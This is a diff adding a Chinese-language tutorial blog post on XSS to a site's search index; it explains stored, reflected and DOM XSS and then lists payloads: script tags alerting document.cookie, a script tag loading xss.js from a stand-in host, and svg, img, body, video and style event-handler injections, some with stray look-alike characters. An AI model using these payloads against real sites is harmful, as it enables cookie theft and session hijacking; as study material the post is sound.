@@ -410,4 +410,41 @@
         <tag>python</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Web_XSS</title>
+    <url>/2022/05/04/web_XSS/</url>
+    <content><![CDATA[<p>xss也算是web安全必备吧，一直没学，现在补一补</p>
+<p>在这之前先搞清楚xss的原理</p>
+<h3 id="XSS的原理和分类"><a href="#XSS的原理和分类" class="headerlink" title="XSS的原理和分类"></a>XSS的原理和分类</h3><p>xss呢就是在web页面插入一段恶意的script代码，用户浏览页面的的时候，嵌入web里的script代码就执行，然后就达到恶意攻击用户的目的。xss是针对用户层面的攻击。</p>
+<p>xss有三类：存储型、反射型和DOM型；</p>
+<h4 id="存储型XSS："><a href="#存储型XSS：" class="headerlink" title="存储型XSS："></a>存储型XSS：</h4><p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie。</p>
+<p><img src="https://img-blog.csdnimg.cn/9c61c961907f4c3abef0610d6cf2644b.png"></p>
+<h4 id="反射型XSS："><a href="#反射型XSS：" class="headerlink" title="反射型XSS："></a>反射型XSS：</h4><p>反射型XSS，非持久化，需要欺骗用户自己去点链接才能触发XSS代码（并没有存储在服务器中），一般容易出现在搜索页面。反射型XSS大多数用来盗取用户的Cookie。</p>
+<p><img src="https://img-blog.csdnimg.cn/892ac6177ed64e8c979cb23f29993d5e.png"></p>
+<h4 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a>DOM型XSS：</h4><p>DOM型XSS，不经过后端，是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 DOM的详解：<a href="https://blog.csdn.net/qq_36119192/article/details/82933873">DOM文档对象模型</a></p>
+<p>可能触发DOM型XSS的属性：</p>
+<blockquote>
+<p>document.referer<br>window.name<br>location<br>innerHTML<br>documen.write</p>
+</blockquote>
+<p>如图，我们在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了。</p>
+<p><img src="https://img-blog.csdnimg.cn/68be657b44fe4c2ca6ebd50fd51ef380.png"></p>
+<h3 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h3><p>以下所有标签的 &gt; 都可以用 // 代替， 例如 <script>alert(1)</script//</p>
+<h4 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h4><p>script标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，可以将代码插入脚本标记中</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hack&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   #弹出hack</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/hack/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   #弹出hack</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>      #弹出cookie</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx.com/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  #引用外部的xss</span><br></pre></td></tr></table></figure>
+
+<h4 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>//</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">1</span>  ο<span class="attr">nerr</span>ο<span class="attr">r</span>=<span class="string">alert(</span>&quot;<span class="attr">hack</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">1</span>  ο<span class="attr">nerr</span>ο<span class="attr">r</span>=<span class="string">alert(document.cookie)</span>&gt;</span>  #弹出cookie</span><br></pre></td></tr></table></figure>
+
+<h4 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> ο<span class="attr">nl</span>ο<span class="attr">ad</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> ο<span class="attr">npagesh</span>ο<span class="attr">w</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> ο<span class="attr">nl</span>ο<span class="attr">adstart</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="style标签"><a href="#style标签" class="headerlink" title="style标签"></a>style标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> ο<span class="attr">nl</span>ο<span class="attr">ad</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
 </search>
